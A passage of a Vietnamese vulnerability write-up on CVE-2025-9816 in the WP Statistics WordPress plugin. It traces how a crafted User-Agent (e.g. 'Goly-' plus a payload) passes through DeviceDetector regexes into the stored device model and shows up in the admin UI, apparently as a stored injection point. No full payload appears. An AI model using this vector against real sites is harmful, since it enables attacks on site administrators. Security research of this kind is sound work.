</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$model</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$brand</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nv">$device</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$model</span> <span class="o">??</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Các logic trong <code>getModel()</code> liên quan đến <code>deviceDetector</code> được khởi tạo trong <code>__construct</code>, ta cần tìm hiểu nó là gì:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserAgentService</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Get HTTP User Agent
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$userAgent</span> <span class="o">=</span> <span class="nx">UserAgent</span><span class="o">::</span><span class="na">getHttpUserAgent</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Initialize DeviceDetector with the user agent string
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deviceDetector</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\WP_Statistics\Dependencies\DeviceDetector\DeviceDetector</span><span class="p">(</span><span class="nv">$userAgent</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deviceDetector</span><span class="o">-&gt;</span><span class="na">parse</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// In case of an error, set deviceDetector to null
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">deviceDetector</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>deviceDetector</code> là một thể hiển của class <code>DeviceDetector</code>, khởi tạo với tham số <code>$userAgent</code> là user-agent được lấy từ HTTP request.</p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/debug2.png"
    alt="Debug cho $userAgent"><figcaption>
      <p>Debug cho $userAgent</p>
    </figcaption>
</figure>

<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DeviceDetector</span> 
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$userAgent</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="o">?</span><span class="nx">ClientHints</span> <span class="nv">$clientHints</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;&#39;</span> <span class="o">!==</span> <span class="nv">$userAgent</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setUserAgent</span><span class="p">(</span><span class="nv">$userAgent</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$clientHints</span> <span class="nx">instanceof</span> <span class="nx">ClientHints</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setClientHints</span><span class="p">(</span><span class="nv">$clientHints</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addClientParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">FeedReader</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addClientParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">MobileApp</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addClientParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">MediaPlayer</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addClientParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">PIM</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addClientParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">Browser</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addClientParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">Library</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addDeviceParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">HbbTv</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addDeviceParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">ShellTv</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addDeviceParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">Notebook</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addDeviceParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">Console</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addDeviceParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">CarBrowser</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addDeviceParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">Camera</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addDeviceParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">PortableMediaPlayer</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addDeviceParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">Mobile</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">addBotParser</span><span class="p">(</span><span class="k">new</span> <span class="nx">Bot</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>DeviceDetector</code> set user-agent và thêm <strong>parser</strong> cho từng loại <strong>device/app</strong>, các parser này có thể liên quan đến <code>$this-&gt;deviceDetector-&gt;parse();</code> được gọi ở trên.</p>
<p>Ta tìm hiểu thử đối số <code>new Mobile()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Mobile</span> <span class="k">extends</span> <span class="nx">AbstractDeviceParser</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">     * @var string
</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$fixtureFile</span> <span class="o">=</span> <span class="s1">&#39;regexes/device/mobiles.yml&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">     * @var string
</span></span></span><span class="line"><span class="cl"><span class="sd">     */</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$parserName</span> <span class="o">=</span> <span class="s1">&#39;mobile&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>$fixtureFile</code> trong <code>Mobile</code> là đường dẫn đến file chứa các regex, để hiểu rõ hơn, ta nhấn tổ hợp phím <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>P</kbd> và search với <code>regexes/device/mobiles.yml</code></p>
<p><figure><img src="/posts/2025-10-08-cve-2025-9816/search3.png"
    alt="Tìm kiếm file regexes/device/mobiles.yml"><figcaption>
      <p>Tìm kiếm file regexes/device/mobiles.yml</p>
    </figcaption>
</figure>

<em>Tìm kiếm file regexes/device/mobiles.yml</em></p>
<p>Nội dung file <code>mobile.yml</code>{: .filepath}:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="c"># Gol Mobile (gol-mobile.com)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">Gol Mobile</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">regex</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;(?:F10_PRIME|F3Prime|F9_PLUS|TEAM_7_3G)(?:[);/ ]|$)&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">device</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;smartphone&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">models</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">regex</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;F10_PRIME&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">model</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;F10 Prime&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">regex</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;F3Prime&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">model</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;F3 Prime&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">regex</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;F9_PLUS&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">model</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;F9 Plus&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">regex</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;TEAM_7_3G&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">device</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;tablet&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">model</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;Team 7.0 3G&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># Goly: </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">Goly</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">regex</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;Goly[ _-]&#39;</span><span class="w">      </span><span class="c"># match khi UA có &#34;Goly-&#34; hoặc &#34;Goly_&#34; hoặc &#34;Goly &#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">device</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;smartphone&#39;</span><span class="w">    </span><span class="c"># loại thiết bị</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">models</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">regex</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;Goly[ _-]([^;/]+) Build&#39;</span><span class="w">   </span><span class="c"># lấy model trước &#34;Build&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">model</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;$1&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">regex</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;Goly[ _-]([^;/)]+)(?:[;/)]|$)&#39;</span><span class="w">  </span><span class="c"># lấy model trước ; / ) hoặc hết chuỗi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">model</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;$1&#39;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># other model</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>mobile.yml</code>{: .filepath} chứa các regex để nhận diện thiết bị mobile, lấy model của nó.</p>
<p>Sau khi <code>DeviceDetector</code> được khởi tạo trong <code>__construct</code> của class <code>UserAgentService</code> thì <code>parse()</code> được gọi để phân tích cú pháp của user-agent.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">parse</span><span class="p">()</span><span class="o">:</span> <span class="nx">void</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isParsed</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parsed</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// skip parsing for empty useragents or those not containing any letter (if no client hints were provided)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">((</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userAgent</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nx">\preg_match</span><span class="p">(</span><span class="s1">&#39;/([a-z])/i&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">userAgent</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="o">&amp;&amp;</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">clientHints</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// other parse
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parseDevice</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Nếu chưa được <code>parse (user-agent mới)</code> thì thực hiện parse bằng hàm <code>parseDevice()</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">parseDevice</span><span class="p">()</span><span class="o">:</span> <span class="nx">void</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$parsers</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getDeviceParsers</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$parsers</span> <span class="k">as</span> <span class="nv">$parser</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">setYamlParser</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getYamlParser</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">setCache</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getCache</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">setUserAgent</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getUserAgent</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">setClientHints</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getClientHints</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">parse</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">device</span> <span class="o">=</span> <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">getDeviceType</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">model</span>  <span class="o">=</span> <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">getModel</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">brand</span>  <span class="o">=</span> <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">getBrand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>parseDevice()</code> lấy các parser đã được khởi tạo trong <code>__construct</code> và gán vào <code>$parsers</code></p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/debug3.png"
    alt="Debug tab cho biến $parsers"><figcaption>
      <p>Debug tab cho biến $parsers</p>
    </figcaption>
</figure>

<p>Sau đó duyệt qua <code>$parsers</code>, set cấu hình bao gồm các regex trong file <code>.yml</code>, nếu regex khớp tức parse thành công, gán model, device, brand cho <code>DeviceDetector</code></p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/debug4.png"
    alt="Debug tab gán giá trị cho các tham số của DeviceDetector"><figcaption>
      <p>Debug tab gán giá trị cho các tham số của DeviceDetector</p>
    </figcaption>
</figure>

<figure><img src="/posts/2025-10-08-cve-2025-9816/debug5.png"
    alt="Debug tab giá trị của model"><figcaption>
      <p>Debug tab giá trị của model</p>
    </figcaption>
</figure>

<p>Như vậy ta đã biết được cách kiểm soát model trước khi gán nó vào <code>$visitor</code> và thêm vào database.</p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/debug6.png"
    alt="Debug tab giá trị của model trong $visitor"><figcaption>
      <p>Debug tab giá trị của model trong $visitor</p>
    </figcaption>
</figure>

<p>Kiểm tra <strong>database</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">ID</span><span class="p">,</span><span class="w"> </span><span class="n">last_counter</span><span class="p">,</span><span class="w"> </span><span class="n">referred</span><span class="p">,</span><span class="w"> </span><span class="n">agent</span><span class="p">,</span><span class="w"> </span><span class="n">platform</span><span class="p">,</span><span class="w"> </span><span class="k">version</span><span class="p">,</span><span class="w"> </span><span class="n">device</span><span class="p">,</span><span class="w"> </span><span class="n">model</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">wp_statistics_visitor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------------+----------+---------------+----------+---------+------------+--------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">last_counter</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">referred</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">agent</span><span class="w">         </span><span class="o">|</span><span class="w"> </span><span class="n">platform</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">device</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">model</span><span class="w">        </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------------+----------+---------------+----------+---------+------------+--------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="mi">63</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">01</span><span class="w">   </span><span class="o">|</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="n">Chrome</span><span class="w"> </span><span class="n">Mobile</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Android</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">93</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">smartphone</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Google</span><span class="w"> </span><span class="n">Pixel</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">01</span><span class="w">   </span><span class="o">|</span><span class="w">          </span><span class="o">|</span><span class="w"> </span><span class="n">Chrome</span><span class="w"> </span><span class="n">Mobile</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Android</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="mi">93</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">smartphone</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Goly</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------------+----------+---------------+----------+---------+------------+--------------+</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Kiểm tra trong <strong>UI tab models</strong>:</p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/ui1.png"
    alt="Model được hiển thị trong UI tab models"><figcaption>
      <p>Model được hiển thị trong UI tab models</p>
    </figcaption>
</figure>

<h3 class="heading-element" id="sources--sinks"><span>Sources &amp; Sinks</span>
  <a href="#sources--sinks" class="heading-mark">
